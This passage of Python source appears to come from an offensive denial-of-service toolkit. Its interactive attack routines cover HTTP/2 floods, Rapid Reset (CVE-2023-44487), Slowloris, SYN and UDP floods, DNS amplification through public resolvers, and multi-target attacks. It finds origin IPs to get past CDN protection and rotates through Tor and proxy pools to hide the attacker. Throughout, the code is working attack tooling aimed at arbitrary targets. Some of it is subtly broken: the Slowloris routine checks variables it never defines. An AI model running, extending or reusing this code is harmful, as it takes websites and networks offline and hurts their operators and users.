                return proxy_q.get_nowait()

        th = _th.Thread(
            target=run_h2_exhaust,
            name=f"flood_{name}",
            kwargs=dict(
                target_url=effective_url, rps=wrps,
                duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
                stats_queue=_Proxy(name), stop_event=stop_evt,
                host_header=host_header, connections=conns,
                result_dict=result,
            ),
            daemon=True,
        )
        th.start()
        handles.append((th, stop_evt, result, name))

    # Also start connection-hold engine to exhaust nginx worker_connections
    hold_stop = _th.Event()
    hold_result = {}
    hold_q = _queue.Queue()
    class _HoldProxy:
        def put_nowait(self, item):
            if isinstance(item, dict):
                item["vector_name"] = "hold"
            hold_q.put_nowait(item)
        def get_nowait(self):
            return hold_q.get_nowait()
    # Adjust connection target based on duration (hold more for longer attacks)
    hold_conn_target = min(1000, max(200, duration * 2))
    hold_th = _th.Thread(
        target=run_hold_worker,
        name="flood_hold",
        kwargs=dict(
            target_url=effective_url, duration=float(duration),
            worker_id=9999, stats_queue=_HoldProxy(), stop_event=hold_stop,
            host_header=host_header, connections=hold_conn_target,
        ),
        daemon=True,
    )
    hold_th.start()
    handles.append((hold_th, hold_stop, hold_result, "hold"))
    print(f"  {c('g','[+]')} H2 connection hold: {hold_conn_target} targets")

    try:
        end_at = time.time() + duration
        while time.time() < end_at:
            await asyncio.sleep(0.5)
            if not any(h[0].is_alive() for h in handles):
                break
    except KeyboardInterrupt:
        print(f"\n {c('y','[!]')} Cancelled by user.")

    for _th_obj, evt, _r, _n in handles:
        evt.set()
    for th_obj, _e, _r, _n in handles:
        try:
            await asyncio.get_event_loop().run_in_executor(None, th_obj.join, 5.0)
        except Exception:
            pass

    agg = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
    for _th_obj, _e, r, _n in handles:
        agg["total_requests"] += int(r.get("sent", 0))
        agg["completed"]      += int(r.get("completed", 0))
        agg["failed"]         += int(r.get("failed", 0))
        agg["timeout"]        += int(r.get("timeout", 0))

    await asyncio.sleep(0.5)
    dash.stop()
    print_attack_summary(target, duration, agg)


async def run_http2_flood(target: str, cfg: dict):
    """HTTP/2 Flood with LIVE DASHBOARD and SMART ENGINE SELECTION"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Target RPS (default 4000): ") or "4000")
    threads = int(get_input(" Workers (default 250): ") or "250")
    
    # Self-DoS protection (liberal - user knows their limits)
    if duration > 300 or threads > 500 or rps > 100000:
        print(f" {c('y','[!]')} WARNING: Very high settings (duration={duration}s, threads={threads}, rps={rps})")
        print(f" {c('y','[!]')} This may cause self-DoS")
        confirm = get_input(" Continue anyway? (y/N): ").lower()
        if confirm != "y":
            print(f" {c('r','[-]')} Cancelled.")
            return
    
    # SMART TARGET DETECTION
    print(f"\n {c('c','[*]')} Detecting target speed...")
    try:
        import aiohttp
        start_probe = time.time()
        async with aiohttp.ClientSession() as sess:
            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
        response_time = (time.time() - start_probe) * 1000
        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
        
        if response_time > 1500:
            print(f" {c('y','[!]')} Target is SLOW ({response_time:.0f}ms). Using Python engine.")
            use_python = True
        else:
            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
            use_python = False
    except Exception as e:
        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
        use_python = True
    
    opts = await prompt_attack_options(target)

    parsed_h2 = urlparse(target)
    host_header = opts.get("host_header") or parsed_h2.hostname or ""

    print(f"\n {c('c','[*]')} HTTP/2 Flood | {target} | {duration}s | {rps} RPS")
    if opts["origin_ip"]:
        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    print(f" {c('c','[*]')} Engine: {'Python (slow target)' if use_python else 'Go (fast)'}")
    _rich_sep()

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": "HTTP/2 Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip=opts["origin_ip"], profile_info={},
    )
    dashboard.start()
    
    try:
        if use_python or opts["proxy_pool"]:
            # Use Python engine for slow targets
            from core.attack.engines.enhanced import run_enhanced_attack
            result = await run_enhanced_attack(
                url=target, duration=duration, method="http_get_flood",
                rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
                host_header=host_header, live_stats=vec
            )
            vec["status"] = "done"
        else:
            # Use Go engine for fast targets
            proxy_file = ""
            if opts["proxy_pool"]:
                urls = []
                for plist in opts["proxy_pool"]._pools.values():
                    for ps in plist:
                        urls.append(ps.url)
                if urls:
                    proxy_file = "proxies/_temp_http2.txt"
                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
                    with open(proxy_file, "w") as f:
                        f.write("\n".join(urls))
            
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="http-flood", http2=True, threads=threads,
                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
                live_stats=vec
            )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)


async def run_rapid_reset(target: str, cfg: dict):
    """Rapid Reset with LIVE DASHBOARD, Self-DoS Protection, and SMART FALLBACK"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Streams per second (default 12000): ") or "12000")
    threads = int(get_input(" Workers (default 400): ") or "400")
    
    # Self-DoS protection - AGGRESSIVE WARNING
    if duration > 900 or threads > 600 or rps > 20000:
        print(f"\n {c('r','[!!!]')} CRITICAL WARNING: VERY HIGH SETTINGS DETECTED")
        print(f" {c('r','[!!!]')} Duration: {duration}s | Threads: {threads} | RPS: {rps}")
        print(f" {c('r','[!!!]')} This WILL disconnect your internet (self-DoS)")
        print(f" {c('y','[*]')} Recommended: duration<=300, threads<=200, rps<=5000")
        print(f" {c('y','[*]')} Safe settings: duration=60, threads=100, rps=1000")
        confirm = get_input(f"\n {c('r','Type YES to continue with these dangerous settings:')} ").strip()
        if confirm != "YES":
            print(f" {c('g','[+]')} Cancelled. Using safe defaults instead.")
            duration = min(duration, 60)
            threads = min(threads, 100)
            rps = min(rps, 1000)
            print(f" {c('g','[+]')} Safe mode: duration={duration}s, threads={threads}, rps={rps}")
    
    # SMART TARGET DETECTION
    print(f"\n {c('c','[*]')} Detecting target speed...")
    try:
        import aiohttp
        start_probe = time.time()
        async with aiohttp.ClientSession() as sess:
            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
        response_time = (time.time() - start_probe) * 1000
        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
        
        # INTELLIGENT DECISION
        if response_time > 1500:
            print(f" {c('y','[!]')} Target is VERY SLOW ({response_time:.0f}ms)")
            print(f" {c('y','[!]')} Go engine will timeout. Switching to Python engine...")
            use_python = True
        else:
            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
            use_python = False
    except Exception as e:
        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
        use_python = True
    
    opts = await prompt_attack_options(target)

    print(f"\n {c('c','[*]')} HTTP/2 Rapid Reset (CVE-2023-44487) | {target} | {duration}s | {rps} RPS")
    if opts["origin_ip"]:
        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    print(f" {c('y','[!]')} Low bandwidth, high server CPU impact")
    print(f" {c('c','[*]')} Engine: {'Python (slow target fallback)' if use_python else 'Go (fast)'}")
    _rich_sep()

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": "Rapid Reset (CVE-2023-44487)", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip=opts["origin_ip"], profile_info={},
    )
    dashboard.start()
    
    try:
        if use_python:
            # Use Python engine for slow targets (better timeout handling)
            from core.attack.engines.enhanced import run_enhanced_attack
            result = await run_enhanced_attack(
                url=target, duration=duration, method="http_get_flood",
                rps=min(rps, 500), proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
                live_stats=vec
            )
            vec["status"] = "done"
        else:
            # Use Go engine for fast targets
            proxy_file = ""
            if opts["proxy_pool"]:
                urls = []
                for plist in opts["proxy_pool"]._pools.values():
                    for ps in plist:
                        urls.append(ps.url)
                if urls:
                    proxy_file = "proxies/_temp_rapid_reset.txt"
                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
                    with open(proxy_file, "w") as f:
                        f.write("\n".join(urls))
            
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="rapid-reset", rapid_reset=True, threads=threads,
                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
                live_stats=vec
            )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)


async def run_slowloris(target: str, cfg: dict):
    """Slowloris with LIVE DASHBOARD"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    connections = int(get_input(" Connections (default 1500): ") or "1500")
    
    # Self-DoS protection (liberal - user knows their limits)
    if duration > 300 or threads > 500 or rps > 100000:
        print(f" {c('y','[!]')} WARNING: Very high settings (duration={duration}s, threads={threads}, rps={rps})")
        print(f" {c('y','[!]')} This may cause self-DoS")
        confirm = get_input(" Continue anyway? (y/N): ").lower()
        if confirm != "y":
            print(f" {c('r','[-]')} Cancelled.")
            return
    
    opts = await prompt_attack_options(target)

    sl_target = target
    if opts["origin_ip"]:
        parsed = urlparse(target)
        sl_target = f"{parsed.scheme}://{opts['origin_ip']}{parsed.path or '/'}"

    print(f"\n {c('c','[*]')} Slowloris | {target} | {duration}s | {connections} connections")
    if opts["origin_ip"]:
        print(f" {c('g','[+]')} Hitting origin: {opts['origin_ip']}")
    if opts["proxy_pool"]:
        print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
    _rich_sep()

    # Create single vector with live dashboard
    vectors = []
    vec = {"label": "Slowloris", "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    # Start live dashboard
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
        duration=duration, color_func=c,
        origin_ip=opts["origin_ip"], profile_info={},
    )
    dashboard.start()
    
    try:
        from core.attack.engines.enhanced import run_enhanced_attack
        result = await run_enhanced_attack(
            url=sl_target, duration=duration, method="slowloris",
            rps=connections, proxy_pool=opts["proxy_pool"],
            live_stats=vec
        )
        vec["status"] = "done"
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)

async def run_proxy_flood(target: str, cfg: dict):
    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
    rps = int(get_input(" Target RPS (default 3000): ") or "3000")
    
    # Attack options (origin bypass, host header, etc.)
    opts = await prompt_attack_options(target)
    parsed_pf = urlparse(target)
    host_header = opts.get("host_header") or parsed_pf.hostname or ""
    
    # Proxy selection with Tor support
    print(f"\n {c('c','[*]')} Proxy for Proxy Flood:")
    print(f"   {c('c','[1]')} Load from proxy file")
    print(f"   {c('c','[2]')} Use Tor network (SOCKS5)")
    proxy_sel = get_input(" Choose [1/2] (default 1): ").strip() or "1"
    
    from core.network.proxy import ProxyPool
    from core.attack.engines.enhanced import run_enhanced_attack
    
    proxy_pool = None
    
    if proxy_sel == "2":
        # Tor
        print(f"\n {c('c','[*]')} Setting up Tor network...")
        try:
            from core.network.tor_manager import get_tor_manager
            tor_instances = int(get_input(" Tor instances [1-20] (default 5): ") or "5")
            tor_instances = max(1, min(20, tor_instances))
            manager = get_tor_manager(instances=tor_instances)
            if not manager.is_tor_installed():
                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
                    manager.install_tor()
            if manager.is_tor_installed():
                manager.setup_instances()
                success = manager.start_all()
                if success > 0:
                    await asyncio.sleep(10)
                    health = await manager.check_all_health()
                    healthy = [h for h in health if h.get('is_tor')]
                    if healthy:
                        proxy_pool = ProxyPool(connect_timeout=10)
                        for h in healthy:
                            from core.network.tor_manager import TOR_BASE_SOCKS_PORT
                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
        except Exception as e:
            print(f" {c('r','[-]')} Tor setup failed: {e}")
    
    if proxy_pool is None:
        proxy_file = get_input(" Proxy file (default proxies/http.txt): ") or "proxies/http.txt"
        print(f" {c('c','[*]')} Proxy file: {proxy_file}")
        proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
        total = await proxy_pool.load_file(proxy_file)
        if total == 0:
            print(f" {c('r','[-]')} No proxies loaded from {proxy_file}")
            return
        proxy_pool._validator.set_target(target)
        print(f" {c('c','[*]')} Validating {total} proxies...")
        alive = await proxy_pool.quick_validate(total, concurrency=40)
        if alive == 0:
            print(f" {c('r','[-]')} No valid proxies found")
            return
        print(f" {c('g','[+]')} {alive} proxies alive")

    print(f"\n {c('c','[*]')} Proxy Flood | {target} | {duration}s | {rps} RPS")
    if opts.get("origin_ip"):
        print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']} (Host: {host_header})")
    _rich_sep()
    
    health_task = asyncio.create_task(proxy_pool.health_loop())
    
    result = await run_enhanced_attack(
        url=target, duration=duration, method="http_get_flood",
        rps=rps, proxy_pool=proxy_pool,
        origin_ip=opts.get("origin_ip") or "",
        host_header=host_header,
    )
    
    health_task.cancel()
    print_attack_summary(target, duration, result)

async def _run_python_flood(target: str, duration: int, threads: int, method_name: str, vec: dict) -> Dict:
    from core.attack.engines.layer4_v5 import TcpConnectionFlood, UdpFloodV5, MultiVectorFlood, DnsAmplificationFlood
    if method_name == "syn":
        engine = TcpConnectionFlood()
    elif method_name == "udp":
        engine = UdpFloodV5()
    elif method_name == "dns":
        engine = DnsAmplificationFlood()
    elif method_name == "mixed":
        engine = MultiVectorFlood()
    else:
        engine = TcpConnectionFlood()
    vec["status"] = "running"
    task = asyncio.create_task(engine.attack(target, duration=duration, threads=threads))
    while not task.done():
        await asyncio.sleep(0.5)
        sent = getattr(engine, "sent", 0) or 0
        failed = getattr(engine, "failed", 0) or 0
        vec["stats"]["total_requests"] = sent + failed
        vec["stats"]["completed"] = sent
        vec["stats"]["failed"] = failed
    result = await task
    sent = result.get("sent", 0) or 0
    failed = result.get("failed", 0) or 0
    vec["stats"]["total_requests"] = sent + failed
    vec["stats"]["completed"] = sent
    vec["stats"]["failed"] = failed
    vec["status"] = "done"
    return {"total_requests": sent + failed, "completed": sent, "failed": failed, "timeout": 0, "elapsed": duration}

async def run_syn_flood_multi(targets: List[str], cfg: dict):
    """Multi-target: SYN/TCP Flood against multiple targets in parallel."""
    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
    threads = int(get_input(" Workers per target (default 200): ") or "200")
    
    print(f"\n {c('c','[*]')} Multi-Target SYN/TCP Flood")
    print(f" {c('c','[*]')} {len(targets)} targets | {duration}s | {threads} workers/target")
    _rich_sep()
    
    async def attack_one(target):
        # Auto-detect CDN and find origin
        from core.recon.target_detector import auto_detect_target
        profile = await auto_detect_target(target, verbose=False)
        origin_ip = None
        if profile and profile.has_cdn:
            try:
                from core.recon.origin.origin_finder import find_origin_ip
                origin_result = await find_origin_ip(target, timeout=10)
                if origin_result and origin_result.get("origin_ip"):
                    origin_ip = origin_result["origin_ip"]
                    target = origin_ip
            except:
                pass
        
        from core.attack.engines.layer4_v5 import TcpConnectionFlood
        engine = TcpConnectionFlood()
        r = await engine.attack(target, duration=duration, threads=threads)
        return {"sent": r.get("sent", 0), "completed": r.get("sent", 0), "failed": r.get("failed", 0)}
    
    results = await run_multi_target(attack_one, targets, "SYN Flood", duration)
    print_multi_summary(targets, results, duration)

async def run_udp_flood_multi(targets: List[str], cfg: dict):
    """Multi-target: UDP Flood against multiple targets in parallel."""
    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
    threads = int(get_input(" Workers per target (default 200): ") or "200")
    
    print(f"\n {c('c','[*]')} Multi-Target UDP Flood")
    print(f" {c('c','[*]')} {len(targets)} targets | {duration}s | {threads} workers/target")
    _rich_sep()
    
    async def attack_one(target):
        # Auto-detect CDN and find origin
        from core.recon.target_detector import auto_detect_target
        profile = await auto_detect_target(target, verbose=False)
        origin_ip = None
        if profile and profile.has_cdn:
            try:
                from core.recon.origin.origin_finder import find_origin_ip
                origin_result = await find_origin_ip(target, timeout=10)
                if origin_result and origin_result.get("origin_ip"):
                    origin_ip = origin_result["origin_ip"]
                    target = origin_ip
            except:
                pass
        
        from core.attack.engines.layer4_v5 import UdpFloodV5
        engine = UdpFloodV5()
        r = await engine.attack(target, duration=duration, threads=threads)
        return {"sent": r.get("sent", 0), "completed": r.get("sent", 0), "failed": 0}
    
    results = await run_multi_target(attack_one, targets, "UDP Flood", duration)
    print_multi_summary(targets, results, duration)

async def run_syn_flood(target: str, cfg: dict):
    """SYN / TCP Connection Flood with LIVE DASHBOARD + Auto CDN Bypass"""
    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
    rps = int(get_input(" Packets per second (default 5000): ") or "5000")
    threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
    
    if duration > 120 or threads > 2000 or rps > 50000:
        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
        print(f" {c('y','[!]')} This may cause self-DoS")
        confirm = get_input(" Continue anyway? (y/N): ").lower()
        if confirm != "y":
            print(f" {c('r','[-]')} Cancelled.")
            return
    
    # Auto-detect CDN and find origin IP
    print(f"\n {c('c','[*]')} Checking for CDN protection...")
    from core.recon.target_detector import auto_detect_target
    profile = await auto_detect_target(target, verbose=False)
    
    origin_ip = None
    if profile and profile.has_cdn:
        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
        
        try:
            from core.recon.origin.origin_finder import find_origin_ip
            origin_result = await find_origin_ip(target, timeout=15)
            if origin_result and origin_result.get("origin_ip"):
                origin_ip = origin_result["origin_ip"]
                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
                print(f" {c('g','[+]')} Will attack origin directly (CDN bypass)")
                target = origin_ip
            else:
                print(f" {c('r','[-]')} Origin IP not found")
                print(f" {c('y','[!]')} L4 attacks won't work against CDN")
                print(f" {c('y','[!]')} Recommendation: Use Module 9 (Auto Mode V5) for CDN targets")
                confirm = get_input(" Continue anyway? (y/N): ").lower()
                if confirm != "y":
                    return
        except Exception as e:
            print(f" {c('r','[-]')} Origin search failed: {e}")
    else:
        print(f" {c('g','[+]')} No CDN detected - direct attack")
    
    opts = await prompt_attack_options(target, ask_proxy=False)
    if origin_ip and not opts["origin_ip"]:
        opts["origin_ip"] = origin_ip

    print(f"\n {c('c','[*]')} TCP SYN Flood | {target} | {duration}s | {rps} PPS")
    if opts["origin_ip"]:
        print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
    _rich_sep()

    # Use Python fallback on Windows, Go engine on Linux
    use_python = IS_WINDOWS or not os.path.exists(GO_ENGINE)
    if use_python:
        print(f" {c('c','[*]')} Using Python TCP Connection Flood (Windows compat)")

    vectors = []
    vec = {"label": "SYN Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=None,
        duration=duration, color_func=c,
        origin_ip=opts["origin_ip"], profile_info={},
    )
    dashboard.start()
    
    try:
        if use_python:
            result = await _run_python_flood(target, duration, threads, "syn", vec)
        else:
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="syn-flood", threads=threads, origin_ip=opts["origin_ip"],
                live_stats=vec
            )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)


async def run_udp_flood(target: str, cfg: dict):
    """UDP Flood with LIVE DASHBOARD + Auto CDN Bypass"""
    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
    rps = int(get_input(" Packets per second (default 5000): ") or "5000")
    threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
    
    if duration > 120 or threads > 2000 or rps > 50000:
        print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, threads={threads}, rps={rps})")
        print(f" {c('y','[!]')} This may cause self-DoS")
        confirm = get_input(" Continue anyway? (y/N): ").lower()
        if confirm != "y":
            print(f" {c('r','[-]')} Cancelled.")
            return
    
    # Auto-detect CDN and find origin IP
    print(f"\n {c('c','[*]')} Checking for CDN protection...")
    from core.recon.target_detector import auto_detect_target
    profile = await auto_detect_target(target, verbose=False)
    
    origin_ip = None
    if profile and profile.has_cdn:
        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
        
        try:
            from core.recon.origin.origin_finder import find_origin_ip
            origin_result = await find_origin_ip(target, timeout=15)
            if origin_result and origin_result.get("origin_ip"):
                origin_ip = origin_result["origin_ip"]
                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
                print(f" {c('g','[+]')} Will attack origin directly (CDN bypass)")
                target = origin_ip
            else:
                print(f" {c('r','[-]')} Origin IP not found")
                print(f" {c('y','[!]')} L4 attacks won't work against CDN")
                confirm = get_input(" Continue anyway? (y/N): ").lower()
                if confirm != "y":
                    return
        except Exception as e:
            print(f" {c('r','[-]')} Origin search failed: {e}")
    else:
        print(f" {c('g','[+]')} No CDN detected - direct attack")
    
    opts = await prompt_attack_options(target, ask_proxy=False)
    if origin_ip and not opts["origin_ip"]:
        opts["origin_ip"] = origin_ip

    print(f"\n {c('c','[*]')} UDP Flood | {target} | {duration}s | {rps} PPS")
    if opts["origin_ip"]:
        print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
    _rich_sep()

    use_python = IS_WINDOWS or not os.path.exists(GO_ENGINE)
    if use_python:
        print(f" {c('c','[*]')} Using Python UDP Flood (Windows compat)")

    vectors = []
    vec = {"label": "UDP Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)
    
    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target, vectors=vectors, proxy_pool=None,
        duration=duration, color_func=c,
        origin_ip=opts["origin_ip"], profile_info={},
    )
    dashboard.start()
    
    try:
        if use_python:
            result = await _run_python_flood(target, duration, threads, "udp", vec)
        else:
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="udp-flood", threads=threads, origin_ip=opts["origin_ip"],
                live_stats=vec
            )
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()

    print_attack_summary(target, duration, result)


async def run_dns_amplification(target: str, cfg: dict):
    """DNS Amplification Flood — ~40x traffic amplification via public DNS resolvers"""
    duration = int(get_input(" Duration (seconds, default 30): ") or "30")
    threads = int(get_input(" Concurrent workers (default 100): ") or "100")
    
    if duration > 120:
        print(f" {c('y','[!]')} WARNING: Long DNS flood may get resolvers rate-limited")
        confirm = get_input(" Continue anyway? (y/N): ").lower()
        if confirm != "y":
            print(f" {c('r','[-]')} Cancelled.")
            return

    target_clean = target.replace("https://", "").replace("http://", "").split("/")[0]
    print(f"\n {c('c','[*]')} DNS Amplification Flood | {target_clean} | {duration}s")
    print(f" {c('c','[*]')} Using 25+ public DNS resolvers for ~40x amplification")
    _rich_sep()

    from core.attack.engines.layer4_v5 import DnsAmplificationFlood
    engine = DnsAmplificationFlood()
    
    vectors = []
    vec = {"label": "DNS Amp", "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
    vectors.append(vec)

    from core.monitor.live_dashboard import LiveAttackDashboard
    dashboard = LiveAttackDashboard(
        target=target_clean, vectors=vectors, proxy_pool=None,
        duration=duration, color_func=c, origin_ip="", profile_info={},
    )
    dashboard.start()
    
    try:
        task = asyncio.create_task(engine.attack(target_clean, duration=duration, threads=threads))
        while not task.done():
            await asyncio.sleep(0.5)
            vec["stats"]["total_requests"] = engine.sent
            vec["stats"]["completed"] = engine.sent
        result = await task
        sent = result.get("sent", 0)
        vec["stats"]["total_requests"] = sent
        vec["stats"]["completed"] = sent
        vec["status"] = "done"
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()
    print_attack_summary(target_clean, duration, {"total_requests": sent, "completed": sent, "failed": 0, "timeout": 0, "elapsed": duration})


async def run_mixed_attack(target: str, cfg: dict):
    """Mixed Attack v2 — ALL vectors via multi_vector_engine + AutoDashboard + origin bypass + Auto CDN Detection"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Auto-detect CDN and find origin IP
    print(f"\n {c('c','[*]')} Checking for CDN protection...")
    from core.recon.target_detector import auto_detect_target
    profile = await auto_detect_target(target, verbose=False)
    
    origin_ip = None
    if profile and profile.has_cdn:
        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
        
        try:
            from core.recon.origin.origin_finder import find_origin_ip
            origin_result = await find_origin_ip(target, timeout=15)
            if origin_result and origin_result.get("origin_ip"):
                origin_ip = origin_result["origin_ip"]
                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
                print(f" {c('g','[+]')} L4 vectors will target origin directly")
            else:
                print(f" {c('r','[-]')} Origin IP not found")
                print(f" {c('y','[!]')} L4 vectors disabled, using L7 only")
        except Exception as e:
            print(f" {c('r','[-]')} Origin search failed: {e}")
    else:
        print(f" {c('g','[+]')} No CDN detected - direct attack")

    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
    rps = int(get_input(" Total RPS (default 15000): ") or "15000")

    # Unified attack mode menu (same as Module 9)
    print()
    print(f" {c('c','[*]')} Attack mode:")
    print(f"   {c('c','[1]')} Direct (origin IP only, no Tor / no proxy) {c('g','[fastest]')}")
    print(f"   {c('c','[2]')} Tor network (auto-rotate exit nodes for CF bypass) {c('g','[recommended]')}")
    print(f"   {c('c','[3]')} Proxy pool (load proxies/*.txt, validate, rotate)")
    print(f"   {c('c','[4]')} Tor + Proxy (BOTH - max evasion)")
    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")

    # ----- Tor / Proxy setup -----
    use_tor = mode in ("2", "4")
    use_proxy = mode in ("3", "4")
    tor_instances = 0
    proxy_urls = []
    if use_tor:
        ti = get_input(" Tor instances (default 5): ").strip()
        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
        try:
            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
            from core.network.proxy import ProxyPool
            manager = get_tor_manager(instances=tor_instances)
            if not manager.is_tor_installed():
                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
                    print(f" {c('c','[*]')} Auto-installing Tor...")
                    if not manager.install_tor():
                        print(f" {c('r','[-]')} Tor installation failed")
                    else:
                        print(f" {c('g','[+]')} Tor installed successfully")
                else:
                    print(f" {c('y','[!]')} Tor not available")
            if manager.is_tor_installed():
                manager.setup_instances()
                success = manager.start_all(wait_bootstrap=False)
                if success > 0:
                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
                    bootstrapped = [False] * len(manager.instances)
                    for _ in range(120):
                        for idx, inst in enumerate(manager.instances):
                            if not bootstrapped[idx] and inst.pid:
                                if manager.wait_for_bootstrap(inst, timeout=3):
                                    bootstrapped[idx] = True
                        if all(bootstrapped):
                            break
                        await asyncio.sleep(1)
                    health = await manager.check_all_health()
                    healthy = [h for h in health if h.get('is_tor')]
                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
                    if healthy:
                        for h in healthy:
                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
                        _tor_addrs = [f"127.0.0.1:{TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2}" for h in healthy]
